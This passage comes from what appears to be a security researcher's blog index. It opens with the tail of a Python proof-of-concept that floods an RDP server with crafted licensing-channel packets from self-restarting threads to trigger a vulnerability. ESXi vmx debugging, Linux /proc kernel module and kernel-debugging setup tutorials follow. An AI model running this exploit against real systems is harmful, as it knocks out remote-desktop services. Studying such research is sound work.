\x96\\x2e\\xd3\\xff\\x63\\xe0\\xe3\\x24\\xf1\\x10\\x3d\\x8e\\x0f\\x56\\xbc\\x2e\\xb8\\x90\\x0c\\xfa\\x4b\\x96\\x68\\xfe\\x59\\x68\\x21\\xd0\\xff\\x52\\xfe\\x5c\\x7d\\x90\\xd4\\x39\\xbe\\x47\\x9d\\x8e\\x7a\\xaf\\x95\\x4f\\x10\\xea\\x7b\\x7a\\xd3\\xca\\x07\\x28\\x3e\\x4e\\x4b\\x81\\x0e\\xf1\\x5f\\x1f\\x8d\\xbe\\x06\\x40\\x27\\x2f\\x4a\\x03\\x80\\x32\\x67\\x54\\x2f\\x93\\xfd\\x25\\x5d\\x6d\\xa0\\xad\\x23\\x45\\x72\\xff\\xd1\\xeb\\x5b\\x51\\x75\\xa7\\x61\\xe0\\x3f\\xe4\\xef\\xf4\\x96\\xcd\\xa5\\x13\\x8a\\xe6\\x52\\x74\\x70\\xbf\\xc1\\xf9\\xfb\\x68\\x9e\\xdd\\x72\\x8f\\xb4\\x44\\x5f\\x3a\\xcb\\x75\\x2a\\x20\\xa6\\x69\\xd2\\x76\\xf9\\x57\\x46\\x2b\\x5b\\xda\\xba\\x0f\\x9b\\xe0\\x60\\xe1\\x8b\\x90\\x33\\x41\\x0a\\x2d\\xc5\\x06\\xfe\\xd0\\xf0\\xfc\\xde\\x35\\xd4\\x1e\\xaa\\x76\\x0b\\xae\\xf4\\xd5\\xbd\\xfa\\xf3\\x55\\xf5\\xc1\\x67\\x65\\x75\\x1c\\x1d\\x5e\\xe8\\x3a\\xfe\\x54\\x50\\x23\\x04\\xae\\x2e\\x71\\xc2\\x76\\x97\\xe6\\x39\\xc6\\xb2\\x25\\x87\\x92\\x63\\x52\\x61\\xd1\\x6c\\x07\\xc1\\x1c\\x00\\x30\\x0d\\xa7\\x2f\\x55\\xa3\\x4f\\x23\\xb2\\x39\\xc7\\x04\\x6c\\x97\\x15\\x7a\\xd7\\x24\\x33\\x91\\x28\\x06\\xa6\\xe7\\xc3\\x79\\x5c\\xae\\x7f\\x50\\x54\\xc2\\x38\\x1e\\x90\\x23\\x1d\\xd0\\xff\\x5a\\x56\\xd6\\x12\\x91\\xd2\\x96\\xde\\xcc\\x62\\xc8\\xee\\x9a\\x44\\x07\\xc1\\xec\\xf7\\xb6\\xd9\\x9c\\xfe\\x30\\x1c\\xdd\\xb3\\x3b\\x93\\x65\\x3c\\xb4\\x80\\xfb\\xe3\\x87\\xf0\\xee\\x42\\xd8\\xcf\\x08\\x98\\x4d\\xe7\\x6b\\x99\\x0a\\x43\\xed\\x13\\x72\\x90\\xa9\\x67\\xfd\\x3c\\x63\\x36\\xec\\x55\\xfa\\xf6\\x1f\\x35\\xe7\\x28\\xf3\\x87\\xa6\\xce\\x2e\\x34\\xaa\\x0d\\xb2\\xfe\\x17\\x18\\xa2\\x0c\\x4e\\x5f\\xf0\\xd1\\x98\\x62\\x4a\\x2e\\x0e\\xb0\\x8d\\xb1\\x7f\\x32\\x52\\x8e\\x87\\xc9\\x68\\x7c\\x0c\\xef\\xee\\x88\\xae\\x74\\x2a\\x33\\xff\\x4b\\x4d\\xc5\\xe5\\x18\\x38\\x74\\xc7\\x28\\x83\\xf7\\x72\\x87\\xfc\\x79\\xfb\\x3e\\xce\\xd0\\x51\\x13\\x2d\\x7c\\xb4\\x58\\xa2\\xe6\\x28\\x67\\x4f\\xec\\xa6\\x81\\x6c\\xf7\\x9a\\x29\\xa6\\x3b\\xca\\xec\\xb8\\xa1\\x27\\x50\\xb7\\xef\\xfc\\x81\\xbf\\x5d\\x86\\x20\\x94\\xc0\\x1a\\x0c\\x41\\x50\\xa9\\x5e\\x10\\x4a\\x82\\xf1\\x74\\x1f\\x78\\x21\\xf5\\x70\\x61\\x24\\x00\\x3d\\x47\\x5f\\xf3\\x25\\x80\\x3c\\x4b\\xea\\xa3\\xf4\\x77\\xea\\xa1\\x42\\x1a\\x17\\x0f\\x6d\\xa8\\x35\\x9e\\x91\\x26\\x34\\x43\\x04\\xc6\\xc6\\x5b\\x21\\x7d\\x8c\\xc7\\x22\\x91\\x7b\\x2c\\x2d\\x2f\\xd6\\x7e\\xa5\\x52\\xa8\\x08\\x80\\xeb\\x60\\xd1\\x44\\x09\\x8e\\x3c\\xa1\\xaa\\x67\\x60\\x0a\\x26\\xc6\\xb5\\xc6\\x79\\xa6\\x4f\\x8b\\x8c\\x25\\x5c\\xf1\\x0b\\x23\\xf4\\xd8\\xa6\\x6d\\xf1\\x91\\x78\\xf9\\xe5\\x2a\\x50\\x2f\\x5a\\x44\\x22\\xd9\\x19\\x5c\\xaf\\xd6\\xac\\x97\\xa2\\xf8\\x0d\\x0c\\xe3\\xdd\\x88\\x48\\x98\\x28\\x0b\\x8b\\xbd\\x76\\xdc\\xde\\xca\\xe2\\xc2\\x4a\\x87\\x50\\xd4\\x8c\\x77\\x5a\\xd8\\xb2\\x74\\x4f\\x30\\x35\\xbf\\x28\\xae\\xd9\\xa2\\x98\\xa5\\xbc\\x60\\xca\\xb8\\x90\\x4d\\x20\\x46\\xd9\\x8a\\x1a\\x30\\x01\\x8b\\x38\\x63\\x1a\\x57\\x09\\x51\\x46\\x95\\x9b\\xd8\\x80\\x0c\\xb0\\x77\\x24\\xbf\\x2b\\xd3\\x57\\x22\\xd9\\x19\\x5c\\xaf\\xd6\\xac\\x97\\xa2\\xf8\\x0d\\x0c\\xe3\\xdd\\x88\\x48\\x98\\x28\\x0b\\x8b\\xbd\\x76\\xdc\\xde\\xca\\xe2\\xc2\\x4a\\x87\\x50\\xd4\\x8c\\x56\\x92\\x38\\xed\\x6b\\x9b\\x5b\\x1f\\xba\\x53\\xa1\\x0e\\xf7\\x75\\x10\\x53\\x22\\x4c\\x0a\\x75\\x88\\x54\\x69\\x3f\\x3b\\xf3\\x18\\x67\\x6b\\x0f\\x19\\xd1\\x00\\x25\\x86\\xcd\\xa8\\xd9\\xdd\\x1d\\x8d\\x26\\x87\\x54\\xd9\\x79\\xc0\\x74\\x65\\x90\\xd7\\x33\\x32\\xaf\\xba\\x9d\\x5a\\xd5\\x6c\\x7c\\xa1\\x47\\xe1\\x49\\x6e\\x1c\\xce\\x9f\\x62\\xaa\\x26\\x16\\x3f\\x3c\\xec\\x5b\\x49\\xe5\\xc0\\x60\\xd4\\xbe\\xa7\\x88\\xbc\\xa1\\x9f\\x29\\x71\\x8c\\xeb\\x69\\xf8\\x73\\xfb\\xaf\\x29\\xaa\\x40\\x1b\\xe5\\x92\\xd2\\x77\\xa7\\x2b\\xfb\\xb6\\x77\\xb7\\x31\\xfb\\xdc\\x1e\\x63\\x63\\x7d\\xf2\\xfe\\x3c\\x6a\\xba\\x0b\\x20\\xcb\\x9d\\x64\\xb8\\x31\\x14\\xe2\\x70\\x07\\x2c\\xdf\\x9c\\x6f\\xb5\\x3a\\xc4\\xd5\\xb5\\xc9\\x3e\\x9a\\xd7\\xd5\\x30\\xdc\\x0e\\x19\\x89\\xc6\\x08\\x88\\xe1\\xca\\x81\\xa6\\x28\\xdd\\x9c\\x74\\x05\\x11\\xe7\\xe1\\xcc\\xbc\\xc7\\x76\\xdd\\x55\\xe2\\xcc\\xc2\\xcb\\xd3\\xb6\\x48\\x01\\xdd\\xff\\xba\\xca\\x31\\xab\\x26\\x44\\x1c\\xdc\\x06\\x01\\xdf\\xf2\\x90\\x50\\xb8\\x6b\\x8f\\xe8\\x29\\xf0\\xba\\xec\\xfb\\x2d\\xfd\\x7a\\xfc\\x7f\\x57\\xbd\\xea\\x90\\xf7\\xcf\\x92\\x1e\\xc4\\x20\\xd0\\xb6\\x9f\\xd6\\xdc\\xa1\\x82\\xa9\\x6c\\x5e\\x3e\\x83\\x41\\x57\\x73\\xe9\\xe7\\x5a\\x3f\\xda\\x24\\x4f\\x73\\x5e\\xf4\\xe0\\x92\\x24\\xbd\\x0b\\xd0\\x3c\\x49\\x96\\xb5\\xb5\\x05\\x32\\xcb\\x58\\x1d\\x6f\\x97\\x51\\xee\\x0c\\xdc\\x0b\\x2a\\x60\\xef\\x97\\x3e\\x5a\\x30\\x81\\x15\\x91\\xcf\\x11\\x07\\x25\\x2c\\x41\\xdb\\x70\\x72\\xe1\\x75\\xf6\\xa5\\xff\\xe8\\x44\\xe7\\x03\\xe3\\x61\\xaa\\xdb\\xe0\\x07\\x3d\\x07\\x0b\\xe3\\x5c\\x09\\xa9\\x5e\\x10\\xfd\\xcf\\x74\\x9e\\x23\\xf1\\x30\\x86\\x16\\xef\\x25\\x4e\\xfe\\xa4\\x93\\xa5\\x80\\x0a\\x01\\x39\\xcc\\x11\\x7a\\x6e\\x94\\x22\\x5b\\xd8\\xc6\\xc9\\xa8\\xdf\\x13\\x96\\xb3\\x91\\x33\\x6e\\x87\\xbb\\x94\\x63\\x2d\\x88\\x64\\xa7\\x58\\x89\\xda\\xdc\\x7f\\x2a\\xe3\\xa1\\x66\\xe5\\xc8\\x7f\\xc2\\xdb\\xc7\\x7d\\x2f\\xa9\\x46\\x28\\x45\\x69\\xbc\\xac\\x9f\\x85\\x9e\\xb0\\x9f\\x9a\\x49\\xb4\\xb1\\xcb\" # SBC_HandlePersistentCacheList tls.sendall(p) p = b\"\\x03\\x00\\x00\\x28\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xeb\\x70\\x1a\\x1a\\x00\\x17\\x00\\xf0\\x03\\xea\\x03\\x01\\x00\\x00\\x01\\x00\\x00\\x27\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x32\\x00\" # USR_ProcessRemoteFonts tls.sendall(p)def send_data_to_rdplic(tls, arch): if arch == \"32\": p = b\"\\x03\\x00\\x00\\x2e\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xef\\x70\\x14\\x0c\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\" elif arch == \"64\": p = b\"\\x03\\x00\\x00\\x2e\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xef\\x70\\x14\" p1 = b\"\\x03\\x00\\x00\\x2e\\x02\\xf0\\x80\\x64\\x00\\x07\\x03\\xef\\x70\\x14\\x00\" p2 = \"\\x04\\x00\\x00\\x00\\x03\\x00\\x00\\x00\"+\"\\x50\\x00\\x03\\x00\" else: print(\"Make the second arguement '32' or '64' without quotes\") sys.exit() ba = bytearray() ba.extend(map(ord, p+p2)) # # tpkt len ba[2] = struct.pack(\"&gt;h\", len(p+p2))[0] ba[3] = struct.pack(\"&gt;h\", len(p+p2))[1] # # # MCSi len ba[7+6] = len(p2) tls.sendall(bytes(ba)) # trigger p3 = \"\\x04\\x00\\x00\\x00\\x03\\x00\\x00\\x00\"+\"\\x30\\x16\"+'\\x00\\x00'+struct.pack('&lt;I', 0x500)+'a'*0x500 bb = bytearray() bb.extend(map(ord, p1+p3)) # # tpkt len bb[2] = struct.pack(\"&gt;h\", len(p1+p3))[0] bb[3] = struct.pack(\"&gt;h\", len(p1+p3))[1] # # # MCSi len bb[7+6] = (len(p3)&gt;&gt;8)|0x80 bb[7+7] = len(p3)&amp;0xff while 1: tls.sendall(bytes(bb))IP = ''def main(): global IP tls = send_init_packets(IP) send_client_data(tls) print(\"[+] ClientData Packet Sent\") send_channel_packets(tls) print(\"[+] ChannelJoin/ErectDomain/AttachUser Sent\") send_client_info(tls) print(\"[+] ClientInfo Packet Sent\") # print \"try recv\" # tls.recv(8192) # print \"try recv\" # tls.recv(8192) import time time.sleep(5) # Magic action! I don't know why server won't response correctly, but this works. send_confirm_active(tls, None) print(\"[+] ConfirmActive Packet Sent\") send_establish_session(tls) print(\"[+] Session Established\") send_data_to_rdplic(tls, '64') print(\"[+] Vuln Should Trigger\")def checkThread(sleeptimes=2,initThreadsName=[]): for i in range(0,10080):#循环运行 nowThreadsName=[]#用来保存当前线程名称 now=threading.enumerate()#获取当前线程名 for i in now: nowThreadsName.append(i.getName())#保存当前线程名称 for ip in initThreadsName: if ip in nowThreadsName: pass #当前某线程名包含在初始化线程组中，可以认为线程仍在运行 else: print '==='+ip,'stopped，now restart' t=threading.Thread(target=main,args=())#重启线程 t.setName(ip)#重设name t.start() time.sleep(sleeptimes)#隔一段时间重新运行，检测有没有线程downif __name__ == '__main__': if len(sys.argv) !=2: print \"python poc.py 192.168.170.1\" exit(0) else: IP = sys.argv[1] print 'target ip:'+IP names = [1,2,3,4] threads=[] initThreadsName=[]#保存初始化线程组名字 for i in names: t=threading.Thread(target=main,args=()) t.setName(i) threads.append(t) for t in threads: t.start() init=threading.enumerate()#获取初始化的线程对象 for i in init: initThreadsName.append(i.getName())#保存初始化线程组名字 check=threading.Thread(target=checkThread,args=(2,initThreadsName))#用来检测是否有线程down并重启down线程 check.setName('Thread:check') check.start()","categories":[],"tags":[]},{"title":"在ESXi中调试运行虚拟机的vmx程序(How to debug vmx in ESXi)","slug":"debug_vmx_in_esxi","date":"2020-04-21T02:21:48.296Z","updated":"2020-04-21T03:12:10.259Z","comments":true,"path":"2020/04/21/debug_vmx_in_esxi/","link":"","permalink":"http://474172261.github.io/2020/04/21/debug_vmx_in_esxi/","excerpt":"ESXi自带一个子linux系统, 虽然能实现一部分功能, 但是目前为止, 依然没有公开的教程说过如何调试vmx进程, 本篇教程将分享我的研究成果, 帮助大家轻松调试虚拟机进程.","text":"ESXi自带一个子linux系统, 虽然能实现一部分功能, 但是目前为止, 依然没有公开的教程说过如何调试vmx进程, 本篇教程将分享我的研究成果, 帮助大家轻松调试虚拟机进程. 最简单的方法首先, ESXi 自带一个gdbserver, 所以最简单的方法就是直接跑起程序, 再用gdbserver attach它. 跑起虚拟机, 查看vmx对应的进程id 1234567[root@192:~] ps|grep vmx70639 70639 vmx70643 70639 vmx-vthread-70670644 70639 vmx-filtPoll:c770645 70639 vmx-mks:c770646 70639 vmx-svga:c770647 70639 vmx-vcpu-0:c7 gdbserver attach 上去 1234567891011[root@192:~] gdbserver --attach :8808 70639Attached; pid = 70639!gdb_connected()!gdb_connected()!gdb_connected()!gdb_connected()[root@192:~] gdbserver --attach :8808 70639Attached; pid = 70639!gdb_connected()Listening on port 8808 一定要保证出现Listening on port, 不然 ctrl+c 中断, 再重试就好, 目标进程不受影响. 找一台可以使用gdb的机器, 把ESXi中的vmx文件拷贝到机器中, 然后使用如下命令连接 12345678910[root@192 vv]# gdb -qgdb$ file Desktop/vmx-7.0-15843807.elf Reading symbols from /home/vv/Desktop/vmx-7.0-15843807.elf...Missing separate debuginfo for /home/vv/Desktop/vmx-7.0-15843807.elf(no debugging symbols found)...done.gdb$ target remote 192.168.170.240:8808Remote debugging using 192.168.170.240:8808=&gt; 0x8ce2771248 &lt;__libc_ifunc_impl_list+3304&gt;: cmp rax,0xfffffffffffff000 0x8ce277124e &lt;__libc_ifunc_impl_list+3310&gt;: ja 0x8ce2771275 &lt;__libc_ifunc_impl_list+3349&gt;gdb$ 这样就可以正常调试了 不那么简单的办法如果自带的gdbserver 不太好用, 那也可以自己源码静态编译一个gdb版本拷贝过去, 然后直接用. 自己源码编译一个gdb, 或者用我编译好的gdb, 拷贝到esxi上 运行起虚拟机 运行gdb, 一般会告诉你缺失libtinfo.so.5文件或者libncurses.so.5, 最简单的方法就是创建一个软链接, 把它自带的一个文件软链接成缺失的文件.1[root@192:~] ln -s /lib64/libncurses.so.5 /lib64/libtinfo.so.5 或者从centos 7 3.10内核的系统中拷贝一个过去放在lib64目录下. 使用gdb调试123gdb$ file /bin/vmxgdb$ set architecture i386:x86-64:intelgdb$ attach xxxxx 注意事项如果发现ctrl+c不好使, 那么就把虚拟机的cpu个数设置为1. 如果还是不好使, 建议重新选个guest安装测试.","categories":[],"tags":[]},{"title":"linux 内核和用户态通信之 /proc文件系统","slug":"linux-proc","date":"2020-03-29T07:00:54.368Z","updated":"2020-10-21T06:56:29.491Z","comments":true,"path":"2020/03/29/linux-proc/","link":"","permalink":"http://474172261.github.io/2020/03/29/linux-proc/","excerpt":"/proc 文件系统是一个虚拟文件系统，通过它可以使用一种新的方法在 Linux® 内核空间和用户空间之间进行通信。在 /proc 文件系统中，我们可以将对虚拟文件的读写作为与内核中实体进行通信的一种手段，但是与普通文件不同的是，这些虚拟文件的内容都是动态创建的.","text":"/proc 文件系统是一个虚拟文件系统，通过它可以使用一种新的方法在 Linux® 内核空间和用户空间之间进行通信。在 /proc 文件系统中，我们可以将对虚拟文件的读写作为与内核中实体进行通信的一种手段，但是与普通文件不同的是，这些虚拟文件的内容都是动态创建的. /proc 文件系统包含了一些目录（用作组织信息的方式）和虚拟文件。虚拟文件可以向用户呈现内核中的一些信息，也可以用作一种从用户空间向内核发送信息的手段。 创建一个/proc文件在3.8内核之前,使用create_proc_entry创建一个文件,原型如下: 1234567891011121314151617181920struct proc_dir_entry *create_proc_entry( const char *name, mode_t mode, struct proc_dir_entry *parent );//创建一个虚拟文件struct proc_dir_entry &#123; const char *name; // 节点名称 mode_t mode; // 权限,与chmod的一样,可以使用八进制表示 uid_t uid; // File's user id gid_t gid; // File's group id struct inode_operations *proc_iops; // 索引节点操作函数 struct file_operations *proc_fops; // 文件操作函数 struct proc_dir_entry *parent; // 父目录,如果是NULL,就代表/proc目录 ... read_proc_t *read_proc; // 输出给cat的函数 write_proc_t *write_proc; // 读取用户输入的函数 void *data; // 指向private 数据 atomic_t count; // 使用计数 ...&#125;;void remove_proc_entry( const char *name, struct proc_dir_entry *parent );//不仅可以删除节点,还能删除proc_mkdir创建的目录struct proc_dir_entry *proc_mkdir(const char *name, struct proc_dir_entry *parent); //创建一个虚拟目录 parent 参数可以为 NULL（表示 /proc 根目录），也可以是很多其他值 proc_dir_entry 在文件系统中的位置 proc_root_fs /proc proc_net /proc/net proc_bus /proc/bus proc_root_driver /proc/driver 如果我们想创建一个文件为test_modul的虚拟文件,就这样初始化 1234create_proc_entry( \"test_module\", 0644, NULL );或者pt_root = proc_mkdir(\"test_menu\", NULL);pt_entry1 = create_proc_entry(USER_ENTRY1, 0666, pt_root); /proc文件交互函数read_proc 供用户读取的函数 1234567int mod_read( char *page,//数据写入的位置,该page缓冲区在内核 char **start, off_t off, int count,//定义写入的最大字节数 int *eof, //当数据写入完后,需要设置为1 void *data //private 数据 ); 当需要写入多页数据时(一般一页4Kb),需要用到 start,off. write_proc 读取用户的输入 12345int mod_write( struct file *filp, //指向一个打开的文件结构 const char __user *buff, //用户输入的数据,buff在用户空间,内核要读取需要用到copy_from_user unsigned long len, //长度 void *data ); 其它需要用到的函数 1234567891011121314151617181920212223242526/* 创建一个符号链接 */struct proc_dir_entry *proc_symlink( const char *name, struct proc_dir_entry *parent, const char *dest );/* Create a proc_dir_entry with a read_proc_t in one call */struct proc_dir_entry *create_proc_read_entry( const char *name, mode_t mode, struct proc_dir_entry *base, read_proc_t *read_proc, void *data );/* 从内核空间复制数据到用户空间 */unsigned long copy_to_user( void __user *to, const void *from, unsigned long n );/* 从用户空间到内核 */unsigned long copy_from_user( void *to, const void __user *from, unsigned long n );/* 创建虚拟的连续内存块 */void *vmalloc( unsigned long size );/* 释放vmalloc创建的块 */void vfree( void *addr );/* Export a symbol to the kernel (make it visible to the kernel) */EXPORT_SYMBOL( symbol );/* Export all symbols in a file to the kernel (declare before module.h) */EXPORT_SYMTAB 创建内核驱动123456789101112131415161718#include &lt;linux/module.h&gt;/* Defines the license for this LKM */MODULE_LICENSE(\"GPL\");int my_module_init( void )//自定义的初始化函数&#123; printk(KERN_INFO \"my_module_init called. Module is now loaded.\\n\"); return 0;&#125;void my_module_cleanup( void )//自定义的退出函数&#123; printk(KERN_INFO \"my_module_cleanup called. Module is now unloaded.\\n\"); return;&#125;module_init( my_module_init );//声明初始化函数module_exit( my_module_cleanup );//声明退出函数 从3.10内核开始,create_proc_entry() 函数被替换成proc_create() 函数, 函数区别如下:修改前 123456struct proc_dir_entry *proc_file = create_proc_entry(\"file\",0600,NULL);if (proc_file) &#123; proc_file-&gt;read_proc = file_read; proc_file-&gt;write_proc = file_write; proc_file-&gt;owner = THIS_MODULE;&#125; 修改后 12345678struct file_operations proc_fops=&#123; .read=file_read, .write=file_write, .owner=THIS_MODULE,&#125;;proc_file = proc_create(\"file\", 0600, proc_dir, &amp;proc_fops); 编译安装驱动Makefile 1234567obj-m +&#x3D; simple-km.oall: make -C &#x2F;lib&#x2F;modules&#x2F;&#96;uname -r&#96;&#x2F;build SUBDIRS&#x3D;$(PWD) modulesclean: make -C &#x2F;lib&#x2F;modules&#x2F;&#96;uname -r&#96;&#x2F;build SUBDIRS&#x3D;$(PWD) modules 开头的是tab, 不是空格, 一定要注意 执行如下命令​```bash$ make$ insmod simple-km.ko$ dmesg | tail -5 查看最后5行信息$ lsmod$ rmmod simple-km.ko 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081## 一个简单的示例&#96;&#96;&#96;c#include &lt;linux&#x2F;module.h&gt;#include &lt;linux&#x2F;kernel.h&gt;#include &lt;linux&#x2F;proc_fs.h&gt;#include &lt;linux&#x2F;string.h&gt;#include &lt;linux&#x2F;vmalloc.h&gt;#include &lt;asm&#x2F;uaccess.h&gt;MODULE_LICENSE(&quot;GPL&quot;);MODULE_DESCRIPTION(&quot;Fortune Cookie Kernel Module&quot;);MODULE_AUTHOR(&quot;VictorV&quot;);#define MAX_COOKIE_LENGTH PAGE_SIZEstatic struct proc_dir_entry *proc_entry;static char *cookie_pot; &#x2F;&#x2F; 内存缓冲区static int cookie_index; &#x2F;&#x2F; 指向缓冲区的数据尾部static int next_fortune; &#x2F;&#x2F; 通过\\0分开字符串,此处用来指向下一个需要输出的缓冲字符串ssize_t fortune_write( struct file *filp, const char __user *buff, unsigned long len, void *data )&#123; int space_available &#x3D; (MAX_COOKIE_LENGTH-cookie_index)+1; if (len &gt; space_available) &#123; printk(KERN_INFO &quot;fortune: cookie pot is full!\\n&quot;); return -ENOSPC; &#125; if (copy_from_user( &amp;cookie_pot[cookie_index], buff, len )) &#123; &#x2F;&#x2F;从用户空间读取数据到cookie_pot, return -EFAULT; &#125; cookie_index +&#x3D; len; cookie_pot[cookie_index-1] &#x3D; 0;&#x2F;&#x2F;将最后一位置零 return len;&#125;int fortune_read( char *page, char **start, off_t off,int count, int *eof, void *data )&#123; int len; if (off &gt; 0) &#123; *eof &#x3D; 1; return 0; &#125; if (next_fortune &gt;&#x3D; cookie_index) next_fortune &#x3D; 0;&#x2F;&#x2F;超过数据个数,就循环读取 len &#x3D; sprintf(page, &quot;%s\\n&quot;, &amp;cookie_pot[next_fortune]);&#x2F;&#x2F;将一段字符串写入page next_fortune +&#x3D; len; return len;&#125;int init_fortune_module( void )&#x2F;&#x2F;初始化&#123; int ret &#x3D; 0; cookie_pot &#x3D; (char *)vmalloc( MAX_COOKIE_LENGTH );&#x2F;&#x2F;申请一段内核空间 if (!cookie_pot) &#123; ret &#x3D; -ENOMEM; &#125; else &#123; memset( cookie_pot, 0, MAX_COOKIE_LENGTH ); proc_entry &#x3D; create_proc_entry( &quot;fortune&quot;, 0644, NULL ); if (proc_entry &#x3D;&#x3D; NULL) &#123; ret &#x3D; -ENOMEM; vfree(cookie_pot); printk(KERN_INFO &quot;fortune: Couldn&#39;t create proc entry\\n&quot;); &#125; else &#123; cookie_index &#x3D; 0; next_fortune &#x3D; 0; proc_entry-&gt;read_proc &#x3D; fortune_read;&#x2F;&#x2F;这里定义输出函数 proc_entry-&gt;write_proc &#x3D; fortune_write;&#x2F;&#x2F;定义输入函数 proc_entry-&gt;owner &#x3D; THIS_MODULE; printk(KERN_INFO &quot;fortune: Module loaded.\\n&quot;); &#125; &#125; return ret;&#125;void cleanup_fortune_module( void )&#123; remove_proc_entry(&quot;fortune&quot;, &amp;proc_root); vfree(cookie_pot); printk(KERN_INFO &quot;fortune: Module unloaded.\\n&quot;);&#125;module_init( init_fortune_module );module_exit( cleanup_fortune_module ); 效果: 123456789101112[root@plato]# insmod fortune.ko[root@plato]# echo \"Success is an individual proposition. Thomas Watson\" &gt; /proc/fortune[root@plato]# echo \"If a man does his best, what else is there? Gen. Patton\" &gt; /proc/fortune[root@plato]# echo \"Cats: All your base are belong to us. Zero Wing\" &gt; /proc/fortune[root@plato]# cat /proc/fortuneSuccess is an individual proposition. Thomas Watson[root@plato]# cat /proc/fortuneIf a man does his best, what else is there? General Patton[root@plato]#","categories":[],"tags":[]},{"title":"windows 内核调试配置","slug":"windows-debug-setting","date":"2020-03-29T06:43:22.521Z","updated":"2020-03-29T10:16:20.967Z","comments":true,"path":"2020/03/29/windows-debug-setting/","link":"","permalink":"http://474172261.github.io/2020/03/29/windows-debug-setting/","excerpt":"","text":"添加串口到虚拟机安装好虚拟机后, 添加串口设配, 配置如下 配置虚拟机windows系统(简称Guest)按组合键win+r, 输入 msconfig.做如下配置重启虚拟机 配置外部主机(检查Host)找到windbg的快捷方式, 右键属性, 添加参数-b -k com:port=\\\\.\\pipe\\com_1,baud=115200,pipe” 连接调试器在Guest启动后, 在Host打开刚才设置的windbg快捷方式, 如下便连接成功 添加符号","categories":[],"tags":[]},{"title":"Linux双虚拟机调试","slug":"linux-debug-setting","date":"2020-03-29T06:19:40.629Z","updated":"2021-05-25T08:22:03.545Z","comments":true,"path":"2020/03/29/linux-debug-setting/","link":"","permalink":"http://474172261.github.io/2020/03/29/linux-debug-setting/","excerpt":"","text":"准备内核linux kernel source 配置虚拟机 新建一个虚拟机 添加串口, 并做如下配置此虚拟机作为被调试机 克隆虚拟机 修改串口设备的配置,设定为”该端为客户端”, 此为调试机 在被调试机编译内核 解压内核 12tar jxvf linux-2.6.26.tar.bz2cd linux-* 配置编译参数 1make menuconfig 可能的错误 12345678error: curses.h: No such file or directory基于Debian的发行版（如Debian、Ubuntu）：sudo apt-get install libncurses5-dev基于Red Hat的发行版（如RHEL、CentOS）：sudo yum install ncurses-devel如果出现找不到该包，尝试以下设置：vi &#x2F;etc&#x2F;apt&#x2F;source.list添加其它系统的源[源列表地址](http:&#x2F;&#x2F;mirrors.163.com&#x2F;.help&#x2F;debian.html)比如kali,我添加的debian jessie的源 如果提示窗口太小出错,说明你的命令行窗口小了,放大一点再试试.内核调试需要做如下设置: 1234567Kernel Hacking –&gt; compile-time checks and compiler options –&gt; [*] Compile the kernel with debug info [*] Compile the kernel with frame pointers [*] kernel debugging [*] KGDB: kernel debugger–&gt; &lt;*&gt; KGDB: use kgdb over the serial console 完成上述选项后, 直接save后推出. 编译内核 1234make -j 4 bzImage # -j 代表用多少线程, 不要超过cpu的最大线程数make modulesmake modules_installmake install 修改启动表打开 /boot/grub/grub.conf (如果不存在, 就改grub.cfg文件)针对 grub.conf 123456789101112131415161718192021 1 # grub.conf generated by anaconda 2 # 3 # Note that you do not have to rerun grub after making changes to this file 4 # NOTICE: You have a &#x2F;boot partition. This means that 5 # all kernel and initrd paths are relative to &#x2F;boot&#x2F;, eg. 6 # root (hd0,0) 7 # kernel &#x2F;vmlinuz-version ro root&#x3D;&#x2F;dev&#x2F;VolGroup00&#x2F;LogVol00 8 # initrd &#x2F;initrd-version.img 9 #boot&#x3D;&#x2F;dev&#x2F;hda10 default&#x3D;011 timeout&#x3D;512 splashimage&#x3D;(hd0,0)&#x2F;grub&#x2F;splash.xpm.gz13 hiddenmenu14 title CentOS (2.6.26)15 root (hd0,0)16 kernel &#x2F;vmlinuz-2.6.26 ro root&#x3D;&#x2F;dev&#x2F;VolGroup00&#x2F;LogVol00 17 initrd &#x2F;initrd-2.6.26.img18 title CentOS-4 i386 (2.6.9-67.ELsmp)19 root (hd0,0)20 kernel &#x2F;vmlinuz-2.6.9-67.ELsmp ro root&#x3D;&#x2F;dev&#x2F;VolGroup00&#x2F;LogVol00 &lt;---------------------21 initrd &#x2F;initrd-2.6.9-67.ELsmp.img 在kernel那一行末尾添加 “kgdboc=ttyS0,115200 nokaslr” nokaslr是禁用内核的kaslr机制, 避免某些情况下内核地址随机化导致gdb没办法识别源码. 更多命令可以参考Using kgdb, kdb and the kernel debugger internals 如下图:针对 grub.cfg: 123456789101112131415161718192021menuentry &#39;Ubuntu, with Linux 3.8.0-19-generic&#39; --class ubuntu --class gnu-linux --class gnu --class os $menuentry_id_option &#39;gnulinux-3.8.0-19-generic-advanced-af5e68c6-4f1f-494e-8c35-fc0911ec3564&#39; &#123;recordfail load_video gfxmode $linux_gfx_mode insmod gzio insmod part_msdos insmod ext2 set root&#x3D;&#39;hd0,msdos1&#39; if [ x$feature_platform_search_hint &#x3D; xy ]; then search --no-floppy --fs-uuid --set&#x3D;root --hint-bios&#x3D;hd0,msdos1 --hint-efi&#x3D;hd0,msdos1 --hint-baremetal&#x3D;ahci0,msdos1 af5e68c6-4f1f-494e-8c35-fc0911ec3564 else search --no-floppy --fs-uuid --set&#x3D;root af5e68c6-4f1f-494e-8c35-fc0911ec3564 fi echo &#39;Loading Linux 3.8.0-19-generic ...&#39; linux &#x2F;boot&#x2F;vmlinuz-3.8.0-19-generic root&#x3D;UUID&#x3D;af5e68c6-4f1f-494e-8c35-fc0911ec3564 ro find_preseed&#x3D;&#x2F;preseed.cfg auto noprompt priority&#x3D;critical locale&#x3D;en_US kgdboc&#x3D;ttyS0,115200 kgdbwait quiet ^ | ------------- echo &#39;Loading initial ramdisk ...&#39; initrd &#x2F;boot&#x2F;initrd.img-3.8.0-19-generic&#125; 在新内核对应的内容下添加 “kgdboc=ttyS0,115200” 测试双机调试开启两个虚拟机, 在被调试机上运行命令 1echo hello &gt;/dev/ttyS0 在调试机上运行 1cat /dev/ttyS0 如果调试机没有收到消息, 就实时用/dev/ttyS1, 多试两下就行如果成功了, 记得改grub的配置. 